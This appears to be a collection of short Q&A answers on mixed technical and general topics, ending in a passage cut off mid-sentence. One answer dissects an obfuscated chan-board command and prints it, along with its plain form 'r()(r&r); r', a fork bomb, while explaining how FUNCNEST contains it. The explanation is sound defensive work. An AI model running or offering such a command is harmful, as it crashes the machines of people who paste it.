1177206	When you go to setup a WPS WiFi connection the printer should tell you the PIN to use via its LCD. See page 20 of the Brother Network User's Guide; "Using the PIN method of Wi-Fi Protected Setup": Press "Menu". Navigate to and select "Network". Navigate to and select "WLAN". Navigate to and select "WPS w/PIN Code". When "network I/F switched to Wireless" is displayed, press "OK". The LCD will show an 8 digit PIN and the machine will begin to start searching for a WLAN access point/router for up to 5 minutes.
1236152	In the latest versions [2020], the file system is accessed from: # \\wsl$\<Distribution>: \\wsl$\Ubuntu Previously, as of 2018, The current path is related to which distribution you have installed from the Microsoft Store rather than one global path; for Ubuntu, it was located at: %LOCALAPPDATA%\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs Other distributions should be (to be confirmed) in a similar location under their respective folders within: %LOCALAPPDATA%\Packages\
841586	From this perspective, modern ML regression techniques are not different to classic ones. A mean unbiased model on the log scale will automatically be mean biased after retransformation (by Jensen's inequality). Depending on the aim of your analysis, applying some retransformation bias correction factor might be useful as well for algorithms like XGBoost. (Be careful with models that impose L1/L2 penalties on the intercept though - a rare occasion.) The specific correction factor can be calculated directly from the residuals in the same way as for OLS.
1560634	It does look like it might be a swap problem. Can you manually fsck the drives from single-user mode (e.g., by booting into recovery mode)? You can do a sudo mv /var/run/motd /var/run/motd.old to force a clear of the current /etc/motd file. Also, can you add output of your from cat /etc/fstab ? For swap operations, see these answers: delete old swap partition How to delete a second swap partition safely? A nice graphical swap repair guide using gparted is here.
947367	I´ve got the same problem a while ago. In my case it was an almost defect HDD. The Computer rebooted (with bluescreen which I saw after disableing the automatic reboot) and couldn´t propperly reinitialize the boot order because the disk wasn´t recognized as it should be. Try doing a HDD-Stress-Test with some live-system. If it passes without errors you can be sure it isnt´the hdd. In that case I would follow digitxps suggestion and perform a BIOS flash.
997295	The acronym DNS means Domain Name System. It is a distributed system for translating host names (and other data) to IP addresses in a large scale (world). The name server is usually what people call the local DNS server that a workstation/PC can use as its entry point into the DNS. It will resolve local names, but delegates to other names servers for those it can't answer. There are many name servers, but you don't need to know how many since they are queried as needed. There are only a few "root" name servers (the DNS is hierarchical).
1763075	In PHP unlink() is a function for file system handling, unlink() is used to delete files. Suppose you have uploaded a file and wants to delete this file through the coding then unlink() function is used to delete the file. unset() is a function for variable management. It will make a variable undefined. Or we can say that unset() is used to null out the value of a given variable. OR Unset () is used to destroy a variable in PHP. In can be used to remove a single variable, multiple variables, or an element from an array.
47815	Your bad intonation is more likely to make your informal English sound unnatural than bad grammar is. Putting an extra bad in there to make the sentence less ambiguous is probably a good idea, although it can be omitted. I think is works here, because of the present tense of is more likely It makes more sense that the second half of the sentence is in the present tense as well. bad intonation is more likely to make your... bad grammar is more likely to make your... Although I would say that in casual conversation they could probably all be used and nobody would really notice.
58580	If you go back to market traders and speed talking trying to sell something. Try saying it: one buck for five now say quickly: five for a buck I don't know about you but my brain processes the 2nd one faster. A common tactic is to keep everything at the same price so: Apples 5 for a buck pears 3 for a buck bananas 2 for a buck You brain just registers I get 5 apples, 3 pears and don't need to hear the rest of the sentences. Easier to communicate in a market square vocally and therefore carried on to mainstream sales.
388990	Abjure the easier path of using the Clones, when they were an unknown quantity, and morally questionable at best. They would have lost some territory, to be sure, but they could have raised an involved, patriotic army rather than chucking the responsibility to the clones. This has parallels to the Romans in Gibbon's Decline and Fall of the Roman Empire, whereby an increasingly spoiled citizen class outsources defense of the realm to the provincial yokels, and ultimately falls apart... Palpatine knew the heart of the times, and knew that this wouldn't happen, especially with him in control.
545658	The electrode at which oxidation takes place is known as the anode, while the electrode at which reduction take place is called the cathode. Reduction -> cathode Oxidation -> anode If you see galvanic cell reduction take place at the left electrode, so the left one is the cathode. Oxidation takes place at the right electrode, so the right one is the anode. While in electrolytic cell reduction takes place at the right electrode, so right one is the cathode. Oxidation takes place at the left electrode, so the left one is the anode.
2259932	The meaning of 'pulse' is fairly set (unless we're going to get silly and bring vegetables into it). It's the 'click track' behind the music. The heartbeat. Well - the 'pulse'. 'Beat' has a variety of musical meanings. It can mean the physical gesture made by the conductor. In some modern 'techno' music it can mean a sampled fragment endlessly repeated. It can be used to approve the rhythmic drive of a piece - you'll hear 'That song has a great beat!' rather than 'That song has a great pulse!' Not a term used much about 'classical' music, though some of it has an excellent 'beat'!
135618	What makes your main character as Main? Does it have special powers? Is a wise person? Does he/she is made out through writing? One who makes everything right at the end. If Yes. Be careful to plot the story. Plan well from the beginning. Make your side characters powerful, in parallel, make strong reasons for the main character to leave. Make your readers think/guess of multiple reasons for his/her leaving. Sometimes it can make your story more powerful than before, but sometimes it can backfire and make everything uninteresting. So Yes, the main characters can leave early provided you handle it carefully.
1122599	A format describes the structure of some data, whereas a protocol defines a procedure to handle this data. If you take TCP as an example, you have a definition of the format of a data packet, which tells you at which bit position a specified field like the checksum of a packet starts and ends, and the protocol defines that for opening a TCP connection you need three packets, one from client to server with the SYN-bit set, a second one from server to client with ACK- and SYN-bit set and a third one with ACK-bit set from client to server.
1999427	There are two possible reasons for this: 1) You are running JunOS Worldwide, which does not support encryption and as such will not have the SSH client (or servers for that matter) installed. 2) You are running Junos Domestic which DOES support encryption, but the package is corrupted. Solutions: 1) Upgrade from Junos Worldwide to Junos Domestic 2) Reinstall Junos to restore the package OR turn on FTP services and copy the missing packages from another extracted download and replace the corrupted files in the filesystem. EDIT: Option 3: Call JTAC and make them fix it :)
1001021	thumbs.db is where the thumbnail images for files are stored. They will only be visible if you have your folder options set to display hidden and system files. They are not viral. If you delete a thumbs.db file, the next time you open that folder, Windows will have to re-determine the thumbnail for each file. Also, in Folder Options, selecting "Do not cache thumbnails" will prevent the thumbs.db files from being created. However, these files help the computer navigate through your directories more quickly, so unless you have a specific reason for not needing or wanting them, just leave them alone.
1178831	First, let's look at the whole command: echo "I<RA('1E<W3t`rYWdl&r()(Y29j&r{,3Rl7Ig}&r{,T31wo});r`26<F]F;==" | uudecode It contains a double-quoted string that gets echoed to uudecode. But, note that, within the double-quoted string is a back-quoted string. This string gets executed. The string is: `rYWdl&r()(Y29j&r{,3Rl7Ig}&r{,T31wo});r` If we look at what's in it, we see three commands: rYWdl & r()(Y29j & r{,3Rl7Ig} & r{,T31wo}) r Performing brace expansion on the middle command, we have: rYWdl & r()(Y29j & r r3Rl7Ig & r rT31wo) r The first line tries to run a nonsense command in background. This is unimportant. The second line is important: it defines a function r which, when run, launches two copies of itself. Each of those copies would, of course, launch two more copies. And so on. The third line runs r, starting the fork bomb. The rest of the code, outside of the back-quoted string, is just nonsense for obfuscation. How to run the command safely This code can be run safely if we set limit on function nesting level. This can be done with bash's FUNCNEST variable. Here, we set it to 2 and this stops the recursion: $ export FUNCNEST=2 $ echo "I<RA('1E<W3t`rYWdl&r()(Y29j&r{,3Rl7Ig}&r{,T31wo});r`26<F]F;==" | uudecode bash: rYWdl: command not found bash: Y29j: command not found bash: r: maximum function nesting level exceeded (2) bash: r: maximum function nesting level exceeded (2) bash: r: maximum function nesting level exceeded (2) bash: Y29j: command not found bash: r: maximum function nesting level exceeded (2) bash: Y29j: command not found uudecode fatal error: standard input: Invalid or missing 'begin' line The error messages above show that (a) the nonsense commands rYWdl and Y29j are not found, (b) the fork bomb gets repeatedly stopped by FUNCNEST, and (c) the output of echo does not start with begin and, consequently, is not valid input for uudecode. The fork bomb in its simplest form What would the fork bomb look like if we removed the obscuration? As njzk2 and gerrit suggest, it would look like: echo "`r()(r&r);r`" We can simplify that even further: r()(r&r); r That consists of two statements: one defines the fork-bomb-function r and the second runs r. All the other code, including the pipe to uudecode, was there just for obscuration and misdirection. The original form had yet another layer of misdirection The OP has provided a link to the chann board discussion on which this code appeared. As presented there, the code looked like: eval $(echo "I<RA('1E<W3t`rYWdl&r()(Y29j&r{,3Rl7Ig}&r{,T31wo});r`26<F]F;==" | uudecode) Notice one of the first comments about this code: I fell for it. Copied only the part that echoes and decodes, but still got forkbombed In the form on the chann board, one would naively think that the problem would be the eval statement operating on the output of uudecode. This would lead one to think that removing eval would solve the problem. As we have seen above, this is false and dangerously so.
1258516	Four steps for windows 10 pro to pin your Debian/Ubuntu/OpenSUSE $HOME to the start menu of Windows: From start menu start File Explorer In address bar (not search bar) type %LOCALAPPDATA%. In search bar look for your $HOME directory name, in my case it was ekenny. There will be about 3 versions of this but you want the one with really long path. Right click your home directory and click "Pin to Start". Now you have your home directory pinned to your start menu. I tried creating a shortcut but that doesn't go anywhere intelligible.
1997267	The difference is which architecture SQL Server expects to run on: x86 = 32-bit or 64-bit Intel/AMD CPUs w/ 32-bit or 64-bit Windows OS x64 = 64-bit Intel/AMD CPUs w/ 64-bit Windows OS IA64 = Intel Itanium CPUs running IA64 Windows OS You can discount IA64 -- if you were using it, you'd know it. So that leaves x64 vs x86, which is a tradeoff you need to balance for yourself. In most cases, if you're running Windows x64, you'll want to use SQL Server x64 too.
146935	Try Double Metaphone. The idea behind it is to "hash" similar sounds to the same letters, putting words with similar orthography into an equivalence class. One application is in genealogy, where a historical surname might have dozens of realisations. Your examples would encode to: KRSSTLTFRTSNTLKX0R and KRXSTRLRTRSRTSNTLKXTR and edit distance could provide a metric. Note that Double Metaphone, Soundex and its ilk are only heuristics, and grossly ignore orthography in order to obtain a rough representation.
433585	Kylo Ren has two parents: Han Solo and Leia Organa. Leia is the daughter of Anakin Skywalker/Darth Vader, making Kylo Ren the grandson of Anakin/Vader. Leia refers to their son a number of times in conversation with Han. He met her eyes steadily. “We’ve lost our son, forever.” “Always,” she told him. “From the shadows, in the beginning, even before I realized what was happening, he was manipulating everything, pulling our son toward the dark side. “If you see our son,” Leia whispered, “bring him home.”
1518904	The problem is ls. It was never designed to be used in scripts. Besides, it's also pointless to use ls in scripts, because the shell can do the job much better, by simply using a glob, see http://mywiki.wooledge.org/BashGuide/Patterns zenlist="/tmp/zen list"; touch "$zenlist" "$zenlist"$'\neven with a newline' zenity --list --title='A single-column List' --width=600 --height=450 \ --column='Spaces are allowed within "q u o t e s"' \ "How much wood would a woodchuck chuck," \ "if a wooodchuck could chuck wood?" \ "$zenlist"* And for a general way to put list items with spaces and other chars into a "variable", use bash arrays. # assign some items to start with items=( "How much wood would a woodchuck chuck," "if a wooodchuck could chuck wood?" ) # append some items items+=( "$zenlist"* ) zenity --list --title='A single-column List' --width=600 --height=450 \ --column='Spaces are allowed within "q u o t e s"' "${items[@]}"
44285	Early means 'before a specified or expected time'. earlier also means 'before a specified or expected time' and the specified or expected time can itself be an early time, in which case "earlier" means "more early". The reference time changes. The meeting is at 7PM. Could you arrive early to help me set out chairs? The meeting is at 7PM. Could you arrive an hour earlier to help me set out chairs? Last week, you arrived at 6pm to help put out chairs for the 7pm meeting. Tomorrow, would you be able to arrive a little earlier, at 5:30, to help me set up the sound system too?
70206	Q: What is the thing in: "A fine thing it would be if, on the very day You-Know-Who seems to have disappeared at last, the Muggles found out about us all." A: It is the event that "On the very day You-Know-Who seems to have disappeared at last, the Muggles found out about us all." It may become clearer if you shuffle that around a bit to arrive at "The Muggles found out about us all on the very day You-Know-Who seems to have disappeared at last" In conclusion the fine thing is both of these big events happening on the very same day.
808571	Technically, the Moon is Full at a specific time. Therefore you need to check the time of sunset/moonrise OR sunrise/moonset that is closest to the time of Full Moon. Then you can more accurately compare the variation. Here is the list for 2019 created using the U.S. Naval Observatory website. Longitude E9° 8', Latitude N41° 35' All times in Universal Time (UT) Date of Full Moon -------- Sun ---------- -------- Moon -------- Moon-Sun Date Time Date Time Date Time Diff 1/21/2019 5:16 Rise 1/21/2019 6:45 Set 1/21/2019 6:54 +0:09 2/19/2019 15:53 Set 2/19/2019 17:01 Rise 2/19/2019 16:55 -0:06 3/21/2019 1:43 Rise 3/21/2019 5:26 Set 3/21/2019 5:58 +0:32 4/19/2019 11:12 Set 4/19/2019 18:08 Rise 4/19/2019 18:14 +0:06 5/18/2019 21:11 Set 5/18/2019 18:39 Rise 5/18/2019 18:14 -0:25 6/17/2019 8:31 Rise 6/17/2019 3:49 Set 6/17/2019 3:54 +0:05 7/16/2019 21:38 Set 7/16/2019 18:56 Rise 7/16/2019 18:49 -0:07 8/15/2019 12:29 Rise 8/15/2019 4:32 Set 8/15/2019 4:09 -0:23 9/14/2019 4:33 Rise 9/14/2019 5:02 Set 9/14/2019 4:59 -0:03 10/13/2019 21:08 Set 10/13/2019 16:46 Rise10/13/2019 17:02 +0:16 11/12/2019 13:34 Set 11/12/2019 16:07 Rise11/12/2019 16:25 +0:18 12/12/2019 5:12 Rise 12/12/2019 6:40 Set12/12/2019 6:42 +0:02 The difference is much smaller than your original list. Why this happens MCG and Carl Witthoft explained why it happens, namely because: If the moonrise/set is not the same time as the exact Full Moon, then moonrise/set occurs earlier or later than the sunset/rise. Because the Moon passes above and below the ecliptic (the path of the Sun in the sky), the Full Moon is rarely directly opposite from the Sun. Therefore, it can rise earlier or later than the Sun even when exactly "Full". Even if the Full Moon were exactly opposite from the Sun (180 degrees apart, and in a total lunar eclipse), there would still be a difference between the time of sunset/moonrise. Those times are when the limb of the sun/moon is visible, and the limbs are closer together than 180 degrees apart. Also, atmospheric refraction shrinks the separation a small amount. Where and when are they closest? This is more involved but can be reasoned using the following figure. The Sun is in the direction of 1, so the ring of sunset-sunrise is the circle A-A. The Full Moon is in the direction of 2, so the ring of moonrise-moonset is the circle B-B. Where these two circles cross at C is where the sunset and moonrise (or sunrise and moonset) occur at the same time. The highlighted area is where the Moon and Sun are both above the horizon at the same time. Note that this figure is highly exaggerated for illustrative purposes.
545012	Well, since the pressure in the tank will decrease with usage, you can't ultimately do what you seem to want to do. At a given backing pressure, there are equations to determine the orafice size to get a flow rate - google 'choked flow'. Downstream of the regulator, your orafice should be good for quite some time. For an experimental setup, one would use either a mass flow controller (MFC) to actively control the flow rate, or (much cheaper) one of those little flow indicators with the ball floating in the He (air) stream. Note the second option here is basically an adjustable orafice with integrated flow indicator.
1396092	Generally I prefer to use numbering of components based on the functional block staring with 100, 200, aso. As an example, the power section will have components numbered 1XX (ie R101, C101, U101), the RF will have 3XX (ie R301, L301, U301, Q301), aso. Having it this way also helps me with the BOM and future service/debugging. I never reuse the component identification (number) in a new version of the schematic. Helps everyone that has to look at the PCB/schematic in the future and keeps documentation consistent.
900591	If the Windows Firewall is turned off then it will have no effect, and the Inbound and Outbound rules will mean nothing. Inbound rules: These are to do with other things accessing your computer. If you are running a Web Server on your computer then you will have to tell the Firewall that outsiders are allowed to connect to it. Outbound rules: These are so that you can let some programs use the Internet, and Block others. You will want to let your Web Browser (Internet Explorer, Firefox, Safari, Chrome, Opera...) have access to the Internet, so you will tell Windows Firewall that it's allowed.
493572	The 50mm is "standard" because it's a cheap lens to produce, and in the era of slow films, having a fast max aperture for little money was a good thing for most photographers. Many SLRs were sold with a 50/1.8 or 50/2 as a kit lens. When films became faster most consumers found a slower zoom lens to be more versatile. I believe Oskar Barnack, the creator of the small-format camera (the Leica) chose 50mm as a standard lens because even if it was longer than the theoretical standard of 43mm it was easier to produce a good 50mm using the technology of the time.
789247	Some examples: https://www.academiclabs.com/ Open Science Framework https://www.scilifelab.se/: Open for collaboration: an academic platform for drug discovery and development at SciLifeLab (https://doi.org/10.1016/j.drudis.2016.06.026) https://www.kaggle.com/ to some extent can be used to find academic collaborations centered around a given data set (example). https://researchgate.net was mentioned in some other answers, but it is very scammy, see: https://en.wikipedia.org/w/index.php?title=ResearchGate&oldid=947542863#Criticism Should I send a “cease-and-desist” letter to ResearchGate? ResearchGate: an asset or a waste of time? https://www.academia.edu/ also has their own issues, e.g.: https://en.wikipedia.org/w/index.php?title=Academia.edu&oldid=945557467#Criticism Why does academia.edu reserve the right to sell, modify, and “exploit” my papers if I post them there? Is Academia.edu useful?
333593	If the attacks land, the creature would have the opportunity to initiate a grapple, with itself as the controlling grappler. Since the roll is the same (CMB vs CMD) both for initiating a new grapple and to become the dominant grappler, when already grappling, the only difference is that the creature can deal damage before attempting the grapple. Constrict lets you deal damage when succeeding a grapple check. Initiating a grapple is a success and so is becoming the dominant grappler as such it wouldn't matter if it was made with Grap or trying to control the grapple.
1772295	Although the use of Ctrl+Alt+↑ and Ctrl+Alt+↓ are currently suggested for column selection in Sublime Text 3 for Linux, they don't work. Instead, one has to use alt+shift and the appropriate arrow key according to this technical support response. To get these keybindings to work in Lubuntu 18.04, I commented out the following lines in ~/.config/openbox/lubuntu-rc.xml: <keybind key="S-A-Left"> <action name="SendToDesktop"> <to>left</to> <wrap>no</wrap> </action> </keybind> <keybind key="S-A-Right"> <action name="SendToDesktop"> <to>right</to> <wrap>no</wrap> </action> </keybind> <keybind key="S-A-Up"> <action name="SendToDesktop"> <to>up</to> <wrap>no</wrap> </action> </keybind> <keybind key="S-A-Down"> <action name="SendToDesktop"> <to>down</to> <wrap>no</wrap> </action> </keybind> saved the file, ran openbox --reconfigure and now I can use Shift+Alt together with the appropriate arrow keys to select a column of text in Sublime Text v 3.2.1. Note: openbox --reconfigure does two things: It parses your rc.xml or menu.xml files for errors and it "reloads" the edited (and saved) file so you don't have to log out and log back in for the changes to take effect. Note: If you have LXDE the file to modify is ~/.config/openbox/lxde-rc.xml instead.
2104877	No and yes. By standard, your sender domain is not required to have an MX record. RFC 5321 makes an MX record optional although it's somewhat of a standard today. However, due to spamming practices, a number of receiving servers may reject your messages when there's no MX record for the sender's domain. Since it is no big deal to set up an MX record it is highly recommended to do so for serious traffic. As @MichaelHampton has pointed out, you need to be able to accept messages for the sender's domain in any case - including the postmaster@ and abuse@ aliases - to avoid being categorized as spam.
672376	Indeed, since the likelihood function $$\prod_{i=1}^n \sum_{j=1}^k p_j \varphi(x_i;\mu_j,\sigma_j)$$ is available in closed form, a regular maximisation algorithm like the gradient methods could be applied to this function. Unfortunately, they cannot work because the likelihood is not regular enough for them to find the global maximum: there are several equivalent local modes; it may happen that the likelihood is unbounded at the boundaries of the parameter space. The EM algorithm also ends up in a local mode, hence shares some of these drawbacks but it is usually fast and can be repeated with different starting points to find a global mode.
985823	They will only be within http://tools.ietf.org/html/rfc1918 10.0.0.0 - 10.255.255.255 (10/8 prefix) 172.16.0.0 - 172.31.255.255 (172.16/12 prefix) 192.168.0.0 - 192.168.255.255 (192.168/16 prefix) And that's not just the defaults, that's all you can set them to too. Those are the 3 private IP ranges. As specified by RFC 1918 Now, as far as what is common. That could change in future. But from what i've seen, the 192.168/16 range is most common. Second to that is the 10/8 range. I've seen that too, as you have. It's not uncommon And I've never seen a router set to use anything on 172.16/12 but they could.
2162135	From what I have gathered the only way to be absolutely certain is by probing which should only be done by a herpetologist. However, that may not always be possible, so you can also determine based on the tail. Males have thicker and longer tails, while the females have short and thin tails. Other details can be the size of the snake altogether since males are normally larger, however some exceptions may be out there. Also, male corn snakes that are on the bigger side often have subtle dark streaks that travel down the length of their bodies -- four in total. These streaks do not generally appear in the smaller males of the species, however. Hope this helps
2018127	It depends. Andrew B's answer is spot on, when you register the subdomain in the public DNS zone which also hosts your companies MX records and public website for instance. Most companies would have an internal DNS server, not publically available where you would register the host names for your internal (secret) hosts. Recommended method is to register a dedicated domain for internal use, or alternatively create a subdomain in your primary domain for internal use. But technically you also use your primary domain by creating an internal view on your domain, where depending on the origin of the DNS client an alternate version of the DNS zone would be visible.
851230	Gradient Descent is an algorithm to minimize the $J(\Theta)$! Idea: For current value of theta, calculate the $J(\Theta)$, then take small step in direction of negative gradient. Repeat. Update Equation = Algorithm: while True: theta_grad = evaluate_gradient(J,corpus,theta) theta = theta - alpha * theta_grad But the problem is $J(\Theta)$ is the function of all corpus in windows, so very expensive to compute. Stochastic Gradient Descent repeatedly sample the window and update after each one Stochastic Gradient Descent Algorithm: while True: window = sample_window(corpus) theta_grad = evaluate_gradient(J,window,theta) theta = theta - alpha * theta_grad Usually the sample window size is the power of 2 say 32, 64 as mini batch.
1276916	On my setup (WSL Ubuntu under the "Windows 10 development environment" downloaded from https://developer.microsoft.com/en-us/windows/downloads/virtual-machines) the AppData folder was hidden by default. So had to: open windows explorer go to C:\Users\User\ select view on the meny check hidden items then the AppData folder appears under C:\Users\User and I found my /home/user under C:\Users\User\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_*\LocalState\rootfs\home\user (where * is probably a local code or version depending code of some sorts) Don't know why it's tucked away like that.
2283078	The general rule (in the US) is 7-11 (a 7 inch rise and 11 inch run) (17.78cm-27.94cm). More exactly, no more than 7 3/4 inches (19.7cm) for the riser (vertical) and a minimum of 10 inches (25.4cm) for the tread (horizontal or step). You can find some more information here as well on other stair-related dimensions. To calculate if the steps will be within the Building Codes specs : 2 times the step riser height + 1 tread width equals between 24 and 25 in inches (60.96cm and 63.5cm). example: (2 x 7.5") + 10 = 25 (2 x 19.05cm + 10 = 48.1cm)
2413642	Many other answers give tips like pulling the fuse or cutting wires. Please note that if your question is about the defective Takata airbags, this won't help! The problem is, that this airbags propellants are not properly sealed. "Moisture and humidity could be seeping inside inflators, destabilizing the volatile propellant inside." This means, in the worst case the airbag could explode without an electric ignition, because of the chemical reaction of the water and the propellant. Keep that in mind! Also, you should never ignore a recall on your car. Let a professional repair it. This could save your live, so it should be worth it for you!
58195	There is no reason nor is there a rule. It's all context based. If BK is talking about whoppers and they say "2 for 5" you can deduce two whoppers for five dollars. That's because it is the reasonable idea. It is not two dollars for five whoppers... that's too cheap to make any sense. If they were talking about individual chicken nuggets and they said "2 for 5" you would deduce two dollars for five nuggets. That price would be reasonable, whereas 5 dollars for only two little chicken nuggets is not. People will understand the phrase automatically in a way that makes sense.
1893276	No, you don't really "need" WSUS. If you really prefer to do things manually instead of using automation then by all means remove WSUS. On the other hand, I would consider the break-even point for WSUS, compared to manually managing updates, to be only one computer - the WSUS server itself. Even with just that one machine you gain much greater control over the updates using WSUS, so is well justified. The laptop does indeed present a problem, one many of us have had to deal with. For that I would simply use Microsoft's update site, although doing so pains me. Then again, I regularly block updates that simply don't have a reason to be installed.
225888	For 'trivial murder', I'd say it's dubious if you cannot guarantee the body has the enhanced physiology necessary for the limbs/neck to do damage to the important parts of the body. IMO your best bet would be freezing all vital organ function for the whole duration the body is controlled, but depending on the length of time this might not be enough to guarantee bodily death. However, the point of a setting like that is that the constraints of a body, including its destruction can now be worked around. 'True murder', meaning destruction of the chip that houses the consciousness would be effectively impossible without access to specific tools or engineered circumstances(eg: standing next to a vat of acid)
1393467	Adding a voltage regulator would dissipate more power (although not much, if it's a good switching regulator), which isn't desirable in a battery-operated device. If those chips are meant to run over that full range, then I would take advantage of that. They were probably designed that way to address battery-powered applications. If you want over-voltage protection, put a zener diode across the battery input. That would also give you reverse-battery protection and won't draw additional power (except possibly for a little leakage). Select one whose zener voltage is greater than one battery and is less than two batteries. The current carrying capability should be greater than the current capability of the battery.
1375582	Voltage is a difference of electric potential. To simplify, it is an measure of the difference in concentration of electrons between two points. Volts is a unit of measure of voltage. It would be pretty difficult to have exactly no electron on an electrode, and as the voltage is the difference of potential, it is always relative to somthing. Usually, we say that a given electrode has \$X\$ volts and that implied relative to the ground of the circuit. The voltage of the ground is 0 volts, because it is referenced to itself. However, if you measure the voltage of a ground in one circuit, as a reference of another ground in another circuit, you may see some difference (non-zero).
1496183	Actually there's an easier way.... I never thought in simply trying Ctrl+F on the main window hahaha. That's all you have to do! Ctrl+F on the circuit and a search box will appear. You can search nodes and components there. I just tried. Example: Does exactly what @jonk was hoping to find: highlight the node. Not sure why this is now shown on the submenus or on the Hot Keys section of Settings. If it is on the submenus, I don't find it. And I found the shortcut by accident. Didn't know what happened for that to appear. Until I tried the most simple shortcut and it worked xD.
58193	It's a more-or-less idiomatic construction declaring an exchange rate. Objectively, it doesn't actually matter what's being exchanged for what; if it's burgers for bucks, bananas for books, or cookies for crayons, "two for five" implies that two of something is being exchanged for five of something else. In this case, Burger King is offering to exchange two burgers for five bucks. Normally, in a case like this, one would think that the person with the bucks is buying burgers. If it helps, think of it a little backwards - BK is buying bucks, and paying in burgers, so they're paying two burgers to buy five bucks - "two burgers for five bucks".
58217	The phrases "Buy 2 hamburgers for 5 dollars" and "Spend 2 dollars to get 5 hamburgers" could both be reasonably shortened to "2 for 5". (As Danikov points out, "Buy 2 for the price of 1" is frequently shortened to "2 for 1", making "Buy 2 for the price of 5" an odd, but reasonable interpretation for the phrase as well.) Burger King knows this, which is why they immediately clarify the ambiguity. As to why "Buy 2 for 5 dollars" is preferred over "Spend 5 dollars to get 2", that comes down to psychology. Typically the beginning of a sentence gets more attention than the middle, and Burger King wants listeners to be focused on what they are getting, not what they are spending.
491162	I have a 50mm 1.8 (which unfortunately won't auto-focus for you) and the 35mm 1.8 DX. As mentioned above, the 50mm is really great for portraits - the crop factor with the 50mm gives lovely focus and crispness. I just recently bought the 35mm 1.8 DX lens from B&H and it too is quite good - great in lower light situations and fairly small (in size) so it doesn't add much weight to your camera. I paid about $190 for it, which is great considering how good these 'cheap' prime lenses actually are (as mentioned by Ian P above). For low-light close up photos i don't think you'll be disappointed with it.
437080	In the movie with T. Maguire, Spidey stops a subway train with his net and his arm while standing on front (stupid to think the net wouldn't crush the wall) and not trying to cut of the power. So he is standing there and is trying to stop an accelerating train. Some math? http://www.efm.leeds.ac.uk/CIVE/CIVE1140/examples/examples_solutions_answers_section2_01.pdf Or someone did it before http://www.dailymail.co.uk/sciencetech/article-2284273/Spiderman-really-COULD-stopped-train-web-say-physics-students-have.html So it would need 300.000kN of Force. Or something at 300 metric tons. Ok inconsistent, as someone said above he is ranged around - 10-20t normally.
572179	I just add a good mnemonic tool how to remember the naming convention : Anode = anabasis ( from Greek ana = "upward", bainein = "to step or march") , electrons would be going upwards from the electrode to the wire = oxidation. Xenophon, Anabasis, "The March Up Country" Cathode = cathabasis (the journey downwards), electrons would be going downwards from the wire to the electrode = reduction The terms anabasis/catabasis have application in other domains as well. E.g. anabatic/cathabatic processes in synoptical meteorology are processes related to upward/downward convection of air, like at the front and the back side of the cold front of the 2nd kind.
491148	Most standard because: 50mm on a full frame is said to give a natural field of view. 50mm is apparently an simple focal length to design On a your crop sensor, it is 75e, while the 35mm is 52.5e. Thus, the 35mm lens will be closer to "normal" Reasons why most photographers may choose the 50mm could be to use it for portraits on crop sensors. 75e is a great focal length for portraits, especially when combined with such a wide aperture. Other reasons may include: higher resolution, smoother bokeh, better color, better rendition, higher contrast and microcontrast, more flare resistance, less CA, less distortion, less vignetting, better build quality, faster AF, etc.
942514	A function is a built-in operation, such as SUM(), AVERAGE(), etc. A formula (also known as an equation) is something that the user defines, and can use/refer to various functions in it. A formula starts with an = sign, such as =(D1+D2)/A$3. They are similar in that both return a result based on the calculations that each performs. The difference is that a function is a built-in calculation, while a formula is a user-defined calculation. A formula could just use a single function. For example, if you enter =AVERAGE(A1:A56), that is a formula, using the AVERAGE function. If you enter =SUM(G4+A5) - 25 * MIN(B3:B6), that is a formula which uses both the SUM function and the MIN function, as well as standard mathematical operators (-, +, *).
2016204	Login to SQL server through Management Studio and run this: select @@servername The output will likely reflect the old hostname of the server. If so, run this script, and restart the service. exec sp_dropserver '<oldhostname>\instance' go exec sp_addserver '<newhostname>\instance' , local go Once the service is restarted, open a new query and run the first script again, it should now reflect the new hostname. To change the data and applcation tier settings, you need to edit web.config for each.

556977	The dichotomy between weak- and strong-field ligands that I have often seen constructed here is false and physically inaccurate. Complexes can be in a low-spin state or in a high-spin state. The high-spin state is the one according to Hund’s rule where electrons are filled into the five d orbitals one after the other. A low-spin state is any complex in which the Hund rule is not strictly observed, but some orbitals are filled with two electrons while others remain empty. Classic examples for high-spin complexes are, e.g. $\ce{[FeCl6]^3-, [CoCl4]^2-}$ and others. Examples for low-spin complexes are, e.g. $\ce{[Fe(CN)6]^3-, [Cr(CN)6]^3-}$ and others. While these examples may seem to exemplify your stated dichotomy (with chloride being on the weak-field side and cyanide being on the high-field side), reality is much more complex and the spin state of a complex depends on ligands, metal, oxidation state, counterions and so on. In fact, for 2-picolylamine ($\ce{2{-}pic}$) as a ligand to iron(II), both the low-spin and the high-spin $\ce{[Fe(2{-}pic)3]^2+}$ complexes have been isolated and characterised by crystal structures. The $\ce{Fe-N}$ bond length differs by $19~\mathrm{pm}$ with the high-spin complex obviously having longer bonds. Complexes have a tendency to be in the low-spin state if the metal is not a 3d metal the metal’s oxidation state is higher metal to ligand π-backbonding can take place. Especially that final point is important. Ammonia is very bad at π backbonding (and amide is even π-donating). So calling it a high-field ligand is misappreciating physicochemical reality. It is just ammonia’s strong σ bonding ability that causes a slightly larger field split than water. As such, ammonia is best termed a medium-field ligand. (The same is true for most neutral nitrogen donors.)
1878161	I made a diagram that may be helpful: With regard to static routing, consider the above diagram. We have three separate networks: 192.168.1.0, 192.168.2.0, and 192.168.3.0. At first, network hosts (routers, computers, etc.) can only communicate with other hosts that are on their own network. For instance, the computer named James has a single interface on network 192.168.1.0, so that's the only network that it can 'see'. Initially, it will only be able to communicate with Router A. Router A has network interfaces on the 192.168.1.0 and 192.168.2.0 networks, so those are the two networks that it can 'see'. These are the only networks Router A 'knows' about, so it can only communicate with hosts on the 192.168.1.0 and 192.168.2.0 networks. So Router A doesn't even 'know' that the 192.168.3.0 network exists. Similarly, Router B can 'see' networks 192.168.2.0 and 192.168.3.0. When you enter a route into the table, you're telling a host that there's a new network it can get to, and you're giving it the address of a gateway that it can use to get to the new network. So to be able to contact Jesus (or any other host on the 192.168.3.0 network) from Router A, you'd enter the command: ip route 192.168.3.0 255.255.255.0 192.168.2.2 ^ ^ ^ network mask gateway This works because Router B can 'see' both Router A and Jesus. Thanks to this routing table entry when Router A wants to reach the 192.168.3.0 network, it knows it can get there via Router B at 192.168.2.2, so it sends the packet to Router B. Router B can see the 192.168.3.0 network directly, so it forwards the packet along to Jesus at 192.168.3.11. So, now we know how to direct router A to the 192.168.3.0 network. But what if we want James to also be able to reach the 192.168.3.0 network? Well, Router A already knows how to get 